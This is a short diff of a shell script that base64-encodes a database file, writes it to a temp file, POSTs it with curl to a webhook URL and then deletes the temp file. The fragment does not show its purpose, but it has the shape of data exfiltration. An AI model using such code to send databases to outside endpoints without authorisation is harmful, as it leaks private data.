@@ -28,11 +28,10 @@ if [ ! -f "$DATABASE" ]; then
 fi
 
 # Base64 encode the database file
-ENCODED_FILE=$(base64 "$DATABASE")
+base64 "$DATABASE" >> temp.txt
 
-curl -X POST -H "Content-Type: application/json" -d "{\"DATA\": \"DATA REVEIVE TEST\"}" "$WEBHOOK_URL"
+curl -X POST -H "Content-Type: application/json" -d @temp.txt "$WEBHOOK_URL"
 
-# Send the base64-encoded content as a JSON object
-curl -X POST -H "Content-Type: application/json" -d "{\"file\": \"$ENCODED_FILE\"}" "$WEBHOOK_URL"
 
+rm temp.txt
 echo "The database file has been sent in base64 format."
